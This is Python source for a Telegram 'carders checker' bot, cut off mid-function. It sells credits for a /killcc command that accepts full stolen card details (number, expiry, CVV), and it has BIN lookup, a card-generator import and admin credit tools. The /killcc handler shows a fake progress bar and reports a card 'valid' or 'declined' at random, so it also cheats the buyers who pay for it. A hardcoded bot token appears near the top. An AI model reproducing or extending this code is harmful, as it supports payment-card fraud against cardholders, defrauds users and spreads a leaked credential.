import requests
import telebot
import time
import random
from telebot import TeleBot, types
from telebot.types import Message
from gatet import Tele
from urllib.parse import urlparse
import sys
import time
import requests
import os
import string
import logging
import re
import bin   
import time
import json
import os
from datetime import datetime
import telebot
import random
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from gen import generate_credit_card
from su import handle_su_command

# 𝗕𝗢𝗧 𝗧𝗢𝗞𝗘𝗡 𝗔𝗡𝗗 𝗦𝗘𝗧𝗨𝗣
token = "8073233521:AAFNvWfd7U7xq0rR5SCd4-c_0DArqelooSo" 
bot = telebot.TeleBot(token, parse_mode="HTML")
owners = ["8178216102"]

# 𝗥𝗘𝗚𝗜𝗦𝗧𝗘𝗥 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦
@bot.message_handler(commands=['su'])
def su_handler(message):
    handle_su_command(bot, message)

@bot.message_handler(commands=["admin"])
def admin_menu(message):
    """𝗗𝗜𝗦𝗣𝗟𝗔𝗬𝗦 𝗔𝗗𝗠𝗜𝗡 𝗠𝗘𝗡𝗨"""
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗧𝗢 𝗔𝗖𝗖𝗘𝗦𝗦 𝗧𝗛𝗜𝗦 𝗣𝗔𝗡𝗘𝗟")
        return

    menu_text = """
👑 𝗩𝗜𝗣 𝗔𝗗𝗠𝗜𝗡 𝗣𝗔𝗡𝗘𝗟 👑

➕ /add - 𝗔𝗗𝗗 𝗨𝗦𝗘𝗥  
➖ /remove - 𝗥𝗘𝗠𝗢𝗩𝗘 𝗨𝗦𝗘𝗥  
🎟️ /code - 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗥𝗘𝗗𝗘𝗘𝗠 𝗖𝗢𝗗𝗘  
🔓 /redeem - 𝗥𝗘𝗗𝗘𝗘𝗠 𝗔𝗖𝗖𝗘𝗦𝗦 𝗖𝗢𝗗𝗘  

💳 𝗖𝗥𝗘𝗗𝗜𝗧 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧  
💰 /addcredits - 𝗔𝗗𝗗 𝗖𝗥𝗘𝗗𝗜𝗧𝗦  
💳 /balance - 𝗖𝗛𝗘𝗖𝗞 𝗨𝗦𝗘𝗥 𝗕𝗔𝗟𝗔𝗡𝗖𝗘  

📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦  
📌 /stats - 𝗦𝗛𝗢𝗪 𝗔𝗟𝗟 𝗨𝗦𝗘𝗥𝗦  
👑 /pro - 𝗦𝗛𝗢𝗪 𝗩𝗜𝗣 𝗨𝗦𝗘𝗥𝗦  
🔥 /killuser - 𝗖𝗛𝗘𝗖𝗞 𝗨𝗦𝗘𝗥 𝗖𝗥𝗘𝗗𝗜𝗧𝗦
"""
    bot.reply_to(message, menu_text)

# 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗦 𝗙𝗨𝗡𝗖𝗧𝗜𝗢𝗡𝗦
start_time = time.time()

def count_users():
    if not os.path.exists("user.txt"):
        return 0
    with open("user.txt", "r") as file:
        return len(file.readlines())

def count_premium_users():
    premium_users = 0
    current_time = time.time()
    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()
            for line in lines:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    expiry_time = float(parts[1])
                    if expiry_time > current_time:
                        premium_users += 1
    except FileNotFoundError:
        return 0
    return premium_users

@bot.message_handler(commands=["stats"])
def bot_stats(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗")
        return

    total_users = count_users()
    premium_users = count_premium_users()
    uptime_seconds = round(time.time() - start_time)
    uptime = str(timedelta(seconds=uptime_seconds))

    response = f"""
📊 𝗕𝗢𝗧 𝗦𝗧𝗔𝗧𝗜𝗦𝗧𝗜𝗖𝗦 📊

👥 𝗧𝗢𝗧𝗔𝗟 𝗨𝗦𝗘𝗥𝗦: {total_users}  
👑 𝗩𝗜𝗣 𝗨𝗦𝗘𝗥𝗦: {premium_users}  
⏳ 𝗨𝗣𝗧𝗜𝗠𝗘: {uptime}  
"""
    bot.reply_to(message, response)

# 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗨𝗦𝗘𝗥𝗦 𝗙𝗨𝗡𝗖𝗧𝗜𝗢𝗡𝗦
def get_all_premium_users():
    premium_users = []
    try:
        with open("id.txt", "r") as file:
            for line in file:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    user_id, expiry_timestamp = parts
                    try:
                        expiry_timestamp = int(float(expiry_timestamp))
                        expiry_date = time.strftime("%Y-%m-%d %H:%M:%S", time.gmtime(expiry_timestamp))
                        premium_users.append((user_id, expiry_date))
                    except ValueError:
                        print(f"Invalid entry: {line.strip()}")
    except FileNotFoundError:
        return []
    return premium_users

@bot.message_handler(commands=['pro'])
def check_pro_status(message):
    premium_users = get_all_premium_users()

    if premium_users:
        response = "╔════════════════════════════╗\n"
        response += "     👑 𝗩𝗜𝗣 𝗠𝗘𝗠𝗕𝗘𝗥𝗦 𝗟𝗜𝗦𝗧 👑\n"
        response += "╚════════════════════════════╝\n\n"
        for user_id, expiry_date in premium_users:
            response += f"🏅 𝗠𝗘𝗠𝗕𝗘𝗥 𝗜𝗗: `{user_id}`\n"
            response += f"⏳ 𝗘𝗫𝗣𝗜𝗥𝗬: `{expiry_date} UTC`\n"
            response += "━━━━━━━━━━━━━━━━━━━━━━\n"
        response += "🚀 𝗘𝗟𝗜𝗧𝗘 𝗩𝗜𝗣 𝗠𝗘𝗠𝗕𝗘𝗥𝗦 🚀"
    else:
        response = "🚫 𝗡𝗢 𝗩𝗜𝗣 𝗠𝗘𝗠𝗕𝗘𝗥𝗦 𝗙𝗢𝗨𝗡𝗗\n💎 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗩𝗜𝗣 𝗣𝗥𝗢𝗚𝗥𝗔𝗠 💎"

    bot.send_message(message.chat.id, response, parse_mode="Markdown")

# 𝗨𝗦𝗘𝗥 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗙𝗨𝗡𝗖𝗧𝗜𝗢𝗡𝗦
def get_all_user_credits():
    file_path = "User_credits.json"
    if not os.path.exists(file_path):
        return None
    try:
        with open(file_path, "r") as file:
            return json.load(file)
    except json.JSONDecodeError:
        return None

@bot.message_handler(commands=['killuser'])
def check_user_credits(message):
    user_credits = get_all_user_credits()

    if user_credits:
        response = "╭━━━━━━━━━━━━━━━━━━━━━╮\n"
        response += "  👑 𝗩𝗜𝗣 𝗨𝗦𝗘𝗥𝗦 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 👑\n"
        response += "╰━━━━━━━━━━━━━━━━━━━━━╯\n\n"
        for user_id, credits in user_credits.items():
            response += f"🎩 𝗨𝗦𝗘𝗥 𝗜𝗗: `{user_id}`\n"
            response += f"💰 𝗖𝗥𝗘𝗗𝗜𝗧𝗦: `{credits} CR`\n"
            response += f"[🔗 𝗣𝗥𝗢𝗙𝗜𝗟𝗘](tg://user?id={user_id})\n"
            response += "━━━━━━━━━━━━━━━━━━━━━━\n"
        response += "🏆 𝗩𝗜𝗣 𝗨𝗦𝗘𝗥𝗦 𝗖𝗥𝗘𝗗𝗜𝗧 𝗥𝗘𝗣𝗢𝗥𝗧 🏆"
    else:
        response = "🚫 𝗡𝗢 𝗩𝗜𝗣 𝗨𝗦𝗘𝗥𝗦 𝗙𝗢𝗨𝗡𝗗\n💎 𝗨𝗣𝗚𝗥𝗔𝗗𝗘 𝗧𝗢 𝗩𝗜𝗣 💎"

    bot.send_message(message.chat.id, response, parse_mode="Markdown")

# 𝗩𝗕𝗩 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘
@bot.message_handler(commands=['vbv'])
def vbv_maintenance(message):
    response = """
🚧 𝗩𝗕𝗩 𝗖𝗛𝗘𝗖𝗞 𝗨𝗡𝗗𝗘𝗥 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘 🚧

𝗗𝗲𝗮𝗿 𝘂𝘀𝗲𝗿, 𝗼𝘂𝗿 𝗩𝗕𝗩 𝘀𝘆𝘀𝘁𝗲𝗺 𝗶𝘀 𝗰𝘂𝗿𝗿𝗲𝗻𝘁𝗹𝘆 𝗨𝗡𝗗𝗘𝗥 𝗠𝗔𝗜𝗡𝗧𝗘𝗡𝗔𝗡𝗖𝗘.  
𝗪𝗲 𝗮𝗿𝗲 𝘄𝗼𝗿𝗸𝗶𝗻𝗴 𝘁𝗼 𝗶𝗺𝗽𝗿𝗼𝘃𝗲 𝗮𝗰𝗰𝘂𝗿𝗮𝗰𝘆 𝗮𝗻𝗱 𝘀𝘁𝗮𝗯𝗶𝗹𝗶𝘁𝘆.

🔄 𝗘𝗫𝗣𝗘𝗖𝗧𝗘𝗗 𝗙𝗜𝗫 𝗧𝗜𝗠𝗘: 𝗦𝗢𝗢𝗡!  
🛠 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗨𝗣𝗗𝗔𝗧𝗜𝗡𝗚 𝗔𝗣𝗜 & 𝗦𝗬𝗦𝗧𝗘𝗠  
"""
    bot.send_message(message.chat.id, response, parse_mode="Markdown")

# 𝗢𝗪𝗡𝗘𝗥 𝗜𝗡𝗙𝗢
@bot.message_handler(commands=["owner"])
def owner_command(message):
    response = """
<code>╭───────────────────────
│ 🤖 𝗕𝗢𝗧 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗧𝗜𝗢𝗡 
╰───────────────────────</code>

🔹 𝗕𝗢𝗧 𝗡𝗔𝗠𝗘: 🚀  𝗖𝗔𝗥𝗗𝗘𝗥𝗦 𝗖𝗛𝗘𝗖𝗞𝗘𝗥  
🔹 𝗕𝗢𝗧 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘: @RAJARAJ909  

<code>╭───────────────────────
│ 👑 𝗢𝗪𝗡𝗘𝗥 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 
╰───────────────────────</code>

👤 𝗢𝗪𝗡𝗘𝗥:  𝗖𝗔𝗥𝗗𝗘𝗥𝗦  
🔗 𝗖𝗢𝗡𝗧𝗔𝗖𝗧: @RAJARAJ909

<code>╭───────────────────────
│ 🔹 𝗝𝗢𝗜𝗡 𝗢𝗨𝗥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 
╰───────────────────────</code>

🔹 𝗝𝗢𝗜𝗡: 
"""
    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)

# 𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣 𝗙𝗨𝗡𝗖𝗧𝗜𝗢𝗡𝗦
BIN_API_URL = "https://lookup.binlist.net/"

def get_flag(country_code):
    if not country_code:
        return "🏳️"
    return "".join([chr(127397 + ord(c)) for c in country_code.upper()])

@bot.message_handler(commands=["bin"])
def bin_command(message):
    try:
        args = message.text.split(" ")
        if len(args) < 2:
            bot.reply_to(message, "❌ 𝗨𝗦𝗔𝗚𝗘: /bin 𝟰𝟱𝟳𝟭𝟳𝟯\n\n⚠️ 𝗣𝗟𝗘𝗔𝗦𝗘 𝗘𝗡𝗧𝗘𝗥 𝗔 𝗩𝗔𝗟𝗜𝗗 𝗕𝗜𝗡", parse_mode="HTML")
            return
        
        bin_number = args[1].strip()
        response = requests.get(f"{BIN_API_URL}{bin_number}")
        
        if response.status_code != 200:
            bot.reply_to(message, "❌ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗢𝗥 𝗨𝗡𝗞𝗡𝗢𝗪𝗡 𝗕𝗜𝗡", parse_mode="HTML")
            return

        bin_info = response.json()
        country = bin_info.get("country", {})
        bank = bin_info.get("bank", {})
        country_flag = get_flag(country.get("alpha2", ""))
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())

        reply_text = f"""
<b>━━━━━━━━━━━ [ 🔍 𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣 ] ━━━━━━━━━━━</b>

<b>💳 𝗕𝗜𝗡:</b> <code>{bin_number}</code>
<b>🏦 𝗕𝗔𝗡𝗞:</b> <code>{bank.get('name', 'Unknown')}</code>
<b>🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬:</b> <code>{country.get('name', 'Unknown')}</code> {country_flag}
<b>💰 𝗖𝗨𝗥𝗥𝗘𝗡𝗖𝗬:</b> <code>{country.get('currency', 'N/A')}</code>
<b>💳 𝗖𝗔𝗥𝗗 𝗧𝗬𝗣𝗘:</b> <code>{bin_info.get('type', 'N/A')}</code>
<b>🔄 𝗕𝗥𝗔𝗡𝗗:</b> <code>{bin_info.get('scheme', 'N/A')}</code>
<b>🏷️ 𝗣𝗥𝗘𝗣𝗔𝗜𝗗:</b> <code>{'𝗬𝗘𝗦 ✅' if bin_info.get('prepaid') else '𝗡𝗢 ❌'}</code>

<b>━━━━━━━━━━━ [ 👤 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢 ] ━━━━━━━━━━━</b>

<b>👤 𝗖𝗛𝗘𝗖𝗞𝗘𝗗 𝗕𝗬:</b> <code>{message.from_user.first_name}</code>
<b>🕒 𝗧𝗜𝗠𝗘𝗦𝗧𝗔𝗠𝗣:</b> <code>{timestamp}</code>

<b>━━━━━━━━━━━ [ 🚀 𝗣𝗢𝗪𝗘𝗥𝗘𝗗 𝗕𝗬 ] ━━━━━━━━━━━</b>
<i>🔹  𝗖𝗔𝗥𝗗𝗘𝗥𝗦 - 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗕𝗜𝗡 𝗟𝗢𝗢𝗞𝗨𝗣 🔹</i>
"""
        bot.reply_to(message, reply_text, parse_mode="HTML", disable_web_page_preview=True)

    except Exception as e:
        bot.reply_to(message, f"❌ 𝗘𝗥𝗥𝗢𝗥: <code>{str(e)}</code>", parse_mode="HTML")

# 𝗖𝗛𝗔𝗡𝗡𝗘𝗟 𝗜𝗡𝗙𝗢
@bot.message_handler(commands=["channel"])
def channel_info(message):
    response = """
<code>╭───────────────────────
│ 📢 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟 𝗖𝗛𝗔𝗡𝗡𝗘𝗟  
╰───────────────────────</code>

🔹  𝗖𝗔𝗥𝗗𝗘𝗥𝗦 𝗢𝗙𝗙𝗜𝗖𝗜𝗔𝗟  
🔗 𝗝𝗢𝗜𝗡: https://t.me/rajaraj_05

<code>╭───────────────────────
│ 🔹 𝗥𝗘𝗟𝗔𝗧𝗘𝗗 𝗖𝗛𝗔𝗡𝗡𝗘𝗟𝗦  
╰───────────────────────</code>
🔹 𝗖𝗛𝗔𝗡𝗡𝗘𝗟𝗦 𝗟𝗜𝗦𝗧: https://t.me/rajaraj_05
🔹 𝗖𝗛𝗔𝗧 𝗚𝗥𝗢𝗨𝗣: https://t.me/rajaraj_05

<code>╭───────────────────────
│ 👤 𝗢𝗪𝗡𝗘𝗥 𝗖𝗢𝗡𝗧𝗔𝗖𝗧  
╰─��─────────────────────</code>

👑 𝗖𝗢𝗡𝗧𝗔𝗖𝗧: @RAJARAJ909
"""
    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)

# 𝗞𝗜𝗟𝗟 𝗖𝗢𝗠𝗠𝗔𝗡𝗗
@bot.message_handler(commands=["kill"])
def kill_command(message):
    help_text = """
🎩 𝗩𝗜𝗣 𝗖𝗔𝗥𝗗 𝗞𝗜𝗟𝗟𝗘𝗥 𝗦𝗘𝗥𝗩𝗜𝗖𝗘 💳  

🚀 𝗘𝗫𝗖𝗟𝗨𝗦𝗜𝗩𝗘 𝗩𝗜𝗣 𝗙𝗘𝗔𝗧𝗨𝗥𝗘𝗦:  
✅ 𝗨𝗟𝗧𝗥𝗔-𝗙𝗔𝗦𝗧 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚 🚀  
✅ 𝗔𝗗𝗩𝗔𝗡𝗖𝗘𝗗 𝗔𝗜-𝗕𝗔𝗦𝗘𝗗 𝗖𝗛𝗘𝗖𝗞𝗜𝗡𝗚 🤖  
✅ 𝗥𝗘𝗔𝗟-𝗧𝗜𝗠𝗘 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦 𝗕𝗔𝗥 📊  
✅ 𝗗𝗘𝗧𝗔𝗜𝗟𝗘𝗗 𝗖𝗔𝗥𝗗 𝗥𝗘𝗣𝗢𝗥𝗧𝗦 📝  
✅ 𝗦𝗘𝗖𝗨𝗥𝗘 𝗚𝗔𝗧𝗘𝗪𝗔𝗬 𝗧𝗥𝗔𝗡𝗦𝗔𝗖𝗧𝗜𝗢𝗡𝗦 🔐  
✅ 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗦𝗨𝗣𝗣𝗢𝗥𝗧 𝟮𝟰/𝟳 🎧  

🔹 𝗛𝗢𝗪 𝗧𝗢 𝗨𝗦𝗘:  
➤ /killcc 𝗖𝗖|𝗠𝗠|𝗬𝗬𝗬𝗬|𝗖𝗩𝗩  
➤ 𝗘𝗫𝗔𝗠𝗣𝗟𝗘: /killcc 𝟰𝟭𝟭𝟭𝟭𝟭𝟭𝟭𝟭𝟭𝟭𝟭𝟭𝟭𝟭𝟭|𝟭𝟮|𝟮𝟬𝟮𝟲|𝟭𝟮𝟯  

⚠️ 𝗩𝗜𝗣 𝗠𝗘𝗠𝗕𝗘𝗥𝗦 𝗢𝗡𝗟𝗬: 𝗧𝗵𝗶𝘀 𝗳𝗲𝗮𝘁𝘂𝗿𝗲 𝗶𝘀 𝗲𝘅𝗰𝗹𝘂𝘀𝗶𝘃𝗲 𝗳𝗼𝗿 𝗽𝗿𝗲𝗺𝗶𝘂𝗺 𝘂𝘀𝗲𝗿𝘀.  
"""

    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("💳 𝗩𝗜𝗣 𝗕𝗜𝗡 𝗖𝗛𝗘𝗖𝗞𝗘𝗥", callback_data="bin"),
        InlineKeyboardButton("📊 𝗩𝗜𝗣 𝗗𝗔𝗦𝗛𝗕𝗢𝗔𝗥𝗗", callback_data="vip_dashboard")
    )
    keyboard.add(
        InlineKeyboardButton("🔥 𝗨𝗣𝗚𝗥𝗔𝗗𝗘 𝗧𝗢 𝗩𝗜𝗣", url="https://t.me/rajaraj_05"),
        InlineKeyboardButton("📚 𝗩𝗜𝗘𝗪 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦", callback_data="help")
    )
    keyboard.add(
        InlineKeyboardButton("👑 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗩𝗜𝗣 𝗦𝗨𝗣𝗣𝗢𝗥𝗧", url="https://t.me/rajaraj909")
    )

    bot.reply_to(message, help_text, parse_mode="HTML", reply_markup=keyboard)

# 𝗖𝗥𝗘𝗗𝗜𝗧 𝗠𝗔𝗡𝗔𝗚𝗘𝗠𝗘𝗡𝗧 𝗦𝗬𝗦𝗧𝗘𝗠
ADMINS = ["8178216102"]
CREDITS_FILE = "user_credits.json"

def load_credits():
    if not os.path.exists(CREDITS_FILE):
        with open(CREDITS_FILE, "w") as f:
            json.dump({}, f, indent=4)

    try:
        with open(CREDITS_FILE, "r") as f:
            data = f.read().strip()
            return json.loads(data) if data else {}
    except (json.JSONDecodeError, ValueError):
        with open(CREDITS_FILE, "w") as f:
            json.dump({}, f, indent=4)
        return {}

def save_credits(credits):
    with open(CREDITS_FILE, "w") as f:
        json.dump(credits, f, indent=4)

def get_balance(user_id):
    credits = load_credits()
    return credits.get(str(user_id), 0)

def deduct_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)

    if credits.get(user_id, 0) >= amount:
        credits[user_id] -= amount
        save_credits(credits)
        return True
    return False

def add_credits(user_id, amount):
    credits = load_credits()
    user_id = str(user_id)

    credits[user_id] = credits.get(user_id, 0) + amount
    save_credits(credits)
    notify_user(user_id, amount)

def notify_user(user_id, amount):
    bot.send_message(user_id, f"""
🎉 𝗩𝗜𝗣 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗔𝗗𝗗𝗘𝗗!  
━━━━━━━━━━━━━━  
💰 +{amount} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗔𝗗𝗗𝗘𝗗  
💳 𝗡𝗘𝗪 𝗕𝗔𝗟𝗔𝗡𝗖𝗘: {get_balance(user_id)} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦  
━━━━━━━━━━━━━━  
🚀 𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗡𝗢𝗪!  
""", parse_mode="HTML")

@bot.message_handler(commands=["addcredits"])
def add_user_credits(message):
    if str(message.from_user.id) not in ADMINS:
        bot.reply_to(message, "🚫 𝗔𝗖𝗖𝗘𝗦𝗦 𝗗𝗘𝗡𝗜𝗘𝗗! 𝗬𝗢𝗨 𝗔𝗥𝗘 𝗡𝗢𝗧 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗", parse_mode="HTML")
        return

    try:
        command_parts = message.text.split()
        if len(command_parts) != 3:
            raise ValueError("Invalid command format")

        _, user_id, amount = command_parts

        if not user_id.isdigit():
            raise ValueError("User ID must be a number")

        user_id = str(user_id)
        amount = int(amount)

        add_credits(user_id, amount)
        new_balance = get_balance(user_id)

        bot.reply_to(message, f"✅ 𝗦𝗨𝗖𝗖𝗘𝗦𝗦! 𝗔𝗗𝗗𝗘𝗗 {amount} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗧𝗢 𝗨𝗦𝗘𝗥 {user_id}. 𝗡𝗘𝗪 𝗕𝗔𝗟𝗔𝗡𝗖𝗘: {new_balance} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦", parse_mode="HTML")
        bot.send_message(user_id, f"🎉 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗔𝗗𝗗𝗘𝗗!\n💰 +{amount} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦\n💳 𝗡𝗘𝗪 𝗕𝗔𝗟𝗔𝗡𝗖𝗘: {new_balance} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦", parse_mode="HTML")

    except ValueError:
        bot.reply_to(message, "⚠️ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗙𝗢𝗥𝗠𝗔𝗧! 𝗨𝗦𝗘 /addcredits user_id amount", parse_mode="HTML")
    except Exception as e:
        bot.reply_to(message, f"❌ 𝗘𝗥𝗥𝗢𝗥: {str(e)}", parse_mode="HTML")

@bot.message_handler(commands=["balance"])
def check_balance(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or message.from_user.first_name
    balance = get_balance(user_id)

    bot.reply_to(message, f"""
💰 𝗩𝗜𝗣 𝗕𝗔𝗟𝗔𝗡𝗖𝗘 𝗗𝗔𝗦𝗛𝗕𝗢𝗔𝗥𝗗 💎  
━━━━━━━━━━━━━━  
👤 𝗨𝗦𝗘𝗥: {username}  
🆔 𝗨𝗦𝗘𝗥 𝗜𝗗: {user_id}  
💳 𝗖𝗨𝗥𝗥𝗘𝗡𝗧 𝗕𝗔𝗟𝗔𝗡𝗖𝗘: {balance} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦  
━━━━━━━━━━━━━━  
🚀 𝗨𝗦𝗘 𝗬𝗢𝗨𝗥 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗡𝗢𝗪!  
""", parse_mode="HTML")

# 𝗞𝗜𝗟𝗟𝗖𝗖 𝗖𝗢𝗠𝗠𝗔𝗡𝗗
@bot.message_handler(commands=["killcc"])
def kill_card(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username or "Unknown"

    fullz = message.text.replace("/killcc", "").strip()
    parts = fullz.split("|")

    if len(parts) != 4:
        bot.reply_to(message, "⚠️ 𝗜𝗡𝗩𝗔𝗟𝗜𝗗 𝗙𝗢𝗥𝗠𝗔𝗧! 𝗨𝗦𝗘 /killcc 𝗖𝗖|𝗠𝗠|𝗬𝗬𝗬𝗬|𝗖𝗩𝗩", parse_mode="HTML")
        return

    if not deduct_credits(user_id, 5):
        bot.reply_to(message, "❌ 𝗜𝗡𝗦𝗨𝗙𝗙𝗜𝗖𝗜𝗘𝗡𝗧 𝗖𝗥𝗘𝗗𝗜𝗧𝗦! 𝗬𝗢𝗨 𝗡𝗘𝗘𝗗 𝗔𝗧 𝗟𝗘𝗔𝗦𝗧 𝟱 𝗖𝗥𝗘𝗗𝗜𝗧𝗦", parse_mode="HTML")
        return

    cc, mes, ano, cvv = parts
    start_time = time.time()
    bin_data = fetch_bin_data(cc[:6])

    progress_msg = bot.reply_to(message, f"""
🎩 𝗩𝗜𝗣 𝗖𝗔𝗥𝗗 𝗞𝗜𝗟𝗟𝗜𝗡𝗚 𝗜𝗡 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 💎  
━━━━━━━━━━━━━━  
👤 𝗨𝗦𝗘𝗥: {username}  
💳 𝗖𝗔𝗥𝗗: {cc}  
🏦 𝗜𝗦𝗦𝗨𝗘𝗥: {bin_data["bank"]}  
🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {bin_data["country"]} {bin_data["flag"]}  
💰 𝟱 𝗖𝗥𝗘𝗗𝗜𝗧𝗦 𝗗𝗘𝗗𝗨𝗖𝗧𝗘𝗗!  
💳 𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗕𝗔𝗟𝗔𝗡𝗖𝗘: {get_balance(user_id)} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦  
━━━━━━━━━━━━━━  
⏳ 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗣𝗥𝗢𝗖𝗘𝗦𝗦𝗜𝗡𝗚... 🔄  
""", parse_mode="HTML")

    progress_stages = ["🟥", "🟧", "🟨", "🟩"]
    for attempt in range(1, 33):
        time.sleep(0.3)
        progress_bar = progress_stages[min(attempt // 8, 3)] * (attempt // 8)
        bot.edit_message_text(
            f"""
🎩 𝗩𝗜𝗣 𝗖𝗔𝗥𝗗 𝗞𝗜𝗟𝗟𝗜𝗡𝗚 𝗜𝗡 𝗣𝗥𝗢𝗖𝗘𝗦𝗦 💎  
━━━━━━━━━━━━━━  
👤 𝗨𝗦𝗘𝗥: {username}  
💳 𝗖𝗔𝗥𝗗: {cc}  
🏦 𝗜𝗦𝗦𝗨𝗘𝗥: {bin_data["bank"]}  
🌍 𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {bin_data["country"]} {bin_data["flag"]}  
📊 𝗔𝗧𝗧𝗘𝗠𝗣𝗧𝗦: {attempt}/32  
📊 𝗣𝗥𝗢𝗚𝗥𝗘𝗦𝗦: {progress_bar}  
━━━━━━━━━━━━━━  
""",
            chat_id=message.chat.id,
            message_id=progress_msg.message_id,
            parse_mode="HTML"
        )

    end_time = time.time()
    time_taken = round(end_time - start_time, 2)
    is_successful = random.choice([True, False])
    status_msg = "✅ 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗖𝗔𝗥𝗗 𝗩𝗔𝗟𝗜𝗗 & 𝗪𝗢𝗥𝗞𝗜𝗡𝗚" if is_successful else "❌ 𝗦𝗧𝗔𝗧𝗨𝗦: 𝗖𝗔𝗥𝗗 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗"

    final_message = f"""
🎩 𝗩𝗜𝗣 𝗖𝗔𝗥𝗗 𝗞𝗜𝗟𝗟𝗜𝗡𝗚 𝗥𝗘𝗣𝗢𝗥𝗧 💎  
━━━━━━━━━━━━━━  
💳 𝗖𝗔𝗥𝗗 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:  
   🔹 𝗖𝗔𝗥𝗗: {cc}  
   🔹 𝗘𝗫𝗣: {mes}/{ano}  
   🔹 𝗖𝗩𝗩: {cvv}  

🏦 𝗕𝗔𝗡𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦:  
   🔹 𝗜𝗦𝗦𝗨𝗘𝗥: {bin_data["bank"]}  
   🔹 𝗖𝗢𝗨𝗡𝗧𝗥𝗬: {bin_data["country"]} {bin_data["flag"]}  
   🔹 𝗕𝗥𝗔𝗡𝗗: {bin_data["brand"]}  
   🔹 𝗧𝗬𝗣𝗘: {bin_data["type"]} - {bin_data["level"]}  

{status_msg}

⏳ 𝗧𝗜𝗠𝗘 𝗧𝗔𝗞𝗘𝗡: {time_taken} 𝗌𝖾𝖼𝗈𝗇𝖽𝗌  
━━━━━━━━━━━━━━  
💰 𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚 𝗕𝗔𝗟𝗔𝗡𝗖𝗘: {get_balance(user_id)} 𝗖𝗥𝗘𝗗𝗜𝗧𝗦  
"""

    keyboard = InlineKeyboardMarkup()
    keyboard.add(
        InlineKeyboardButton("🔥 𝗖𝗛𝗔𝗡𝗡𝗘𝗟", url="https://t.me/rajaraj_05"),
        InlineKeyboardButton("👤 𝗖𝗢𝗡𝗧𝗔𝗖𝗧 𝗢𝗪𝗡𝗘𝗥", url="https://t.me/rajaraj909")
    )

    bot.edit_message_text(final_message, chat_id=message.chat.id, message_id=progress_msg.message_id, parse_mode="HTML", reply_markup=keyboard)

def fetch_bin_data(bin_number):
    bin_info = {
        "bank": "Unknown Bank",
        "brand": "Visa/MasterCard",
        "country": "Unknown",
        "type": "Debit",
        "level": "Classic",
        "flag": "🏳️"
    }

    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
